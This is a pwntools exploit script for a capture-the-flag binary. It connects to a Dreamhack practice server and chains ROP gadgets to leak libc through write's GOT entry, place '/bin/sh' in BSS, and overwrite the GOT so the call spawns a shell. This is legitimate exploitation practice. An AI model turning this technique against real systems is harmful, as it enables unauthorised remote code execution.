from pwn import *


def main():
    proc = remote("host1.dreamhack.games", 22662)

    libc = ELF("./libc.so.6", checksec=False)
    libc_write_offset = libc.symbols["write"]
    libc_system_offset = libc.symbols["system"]

    elf = ELF("./basic_rop_x86", checksec=False)
    bss = elf.bss()
    write_got = elf.got["write"]

    binsh = b"/bin/sh\x00"

    # 1. Initialize
    """
    | buf    | dummy | SFP | RET |
    | A*0x40 |  A*4  | A*4 | S1  | S2 | S3 | S4 |

    # Gadgets
    pr = 0x804868b
    pppr = 0x8048689

    read_plt = elf.plt["read"]
    write_plt = elf.plt["write"]
    """

    # 2. Fill dummy data
    payload = b"A"*0x48
    rop = ROP(elf)

    # 3. S1: Get ASLRed(real) write_got
    """
    Ref. write(fd, buffer, length)
    | write_plt | pppr | 1  | write_got | 4  |
    | func_ptr  | pppr | p1 |    p2     | p3 |

    payload += p32(write_plt)
    payload += p32(pppr)
    payload += p32(1)
    payload += p32(write_got)
    payload += p32(4)
    """
    rop.write(1, write_got, 4)

    # 4. S2: Set "/bin/sh\x00 to BSS
    """
    Ref. read(fd, buffer, length)
    | read_plt | pppr | 0  | bss | 8  |
    | func_ptr | pppr | p1 | p2  | p3 | 

    payload += p32(read_plt)
    payload += p32(pppr)
    payload += p32(0)
    payload += p32(bss)
    payload += p32(len("/bin/sh")+1)
    """
    rop.read(0, bss, len(binsh))

    # 5. S3: Set system_got to write_got address
    """
    Ref. read(fd, buffer, length)
    | read_plt | pppr | 0  | write_got | 4  |
    | func_ptr | pppr | p1 |    p2     | p3 |

    payload += p32(read_plt)
    payload += p32(pppr)
    payload += p32(0)
    payload += p32(write_got)
    payload += p32(4)
    """
    rop.read(0, write_got, 4)

    # 6. S4: Call write_plt(hooked)
    """
    Ref. system(command)
    | write_plt | pr | bss |
    | func_ptr  | pr | p1  |

    payload += p32(write_plt)
    payload += p32(pr)
    payload += p32(bss)
    """
    rop.write(bss)

    # 7. Get shell
    payload += rop.chain()
    proc.send(payload)
    write = u32(proc.recvuntil(b"\xf7")[-4:])
    system = write - libc_write_offset + libc_system_offset
    proc.send(binsh)
    proc.send(p32(system))
    proc.interactive()
    proc.close()


if __name__ == "__main__":
    main()
